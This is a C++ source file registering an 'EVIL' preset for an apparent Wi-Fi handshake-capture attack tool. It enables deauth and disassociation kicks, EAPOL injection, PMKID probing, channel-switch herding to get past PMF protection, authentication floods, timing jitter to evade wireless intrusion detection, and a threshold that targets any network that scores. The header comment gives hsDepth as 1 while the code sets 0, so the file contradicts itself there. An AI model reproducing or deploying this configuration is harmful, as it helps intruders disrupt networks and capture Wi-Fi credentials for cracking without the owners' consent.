// "EVIL" pack - tuning bundle for the eViL capture method.
//
// eViL is the adaptive hunter: it prioritises targets that already handed us
// part of the 4-way, herds PMF-capable APs it cannot deauth, and lures
// stations to empty APs. This preset feeds it everything it can use:
//   - bidir + EAPOL + PMKID  -> maximal handshake yield per strike
//   - csaHerd                -> the PMF escape route (deauth is dropped)
//   - authFlood              -> the "attract" move on clientless APs
//   - dataAct                -> rank busy rooms first
//   - strictLock             -> never drift off the locked BSSID mid-capture
//   - hsDepth 1              -> keep going until +M3 when possible
//   - depthHoldSec 10        -> hold the lock so M3/M4 still land after a pair
//     (hsDepth/depthHoldSec live on the RADIO page: this pack sets them, as
//      every pack does — see Config::applyRadioPack())
#include "pack_ctx.h"

namespace Cap {
namespace Packs {

static const Preset kEvilPreset{
    /* bidirKick     */ true,   // AP->STA + STA->AP + deauth + disassoc
    /* eapolTx       */ true,   // pump EAPOL-Start/Logoff
    /* pmkidProbe    */ true,   // parallel PMKID route (works against PMF)
    /* csaHerd       */ true,   // herd the PMF-capable targets eViL can't deauth
    /* authFlood     */ true,   // attract stations to otherwise empty APs
    /* kickBurst     */ 3,
    /* pauseMs       */ 800,
    /* lockMs        */ 12000,  // ride out EAPOL retries
    /* hopMs         */ 200,
    /* jitterMs      */ 2,      // anti-WIDS spacing on the broadcast path
    /* cooldownSec   */ 6,      // let victims re-associate between strikes
    /* scoreThr      */ 0,      // attack anything that scores
    /* hsDepth       */ 0,      // press on until +M3 when possible
    /* dataAct       */ 1,      // real data frames feed the hunger score
    /* strictLock    */ true,   // never drift off the locked BSSID
    /* depthHoldSec  */ 10,     // hold after a pair so M3/M4 still land
};

CAP_PACK_REGISTER(evil, "EVIL", "eViL", kEvilPreset)

} // namespace Packs
} // namespace Cap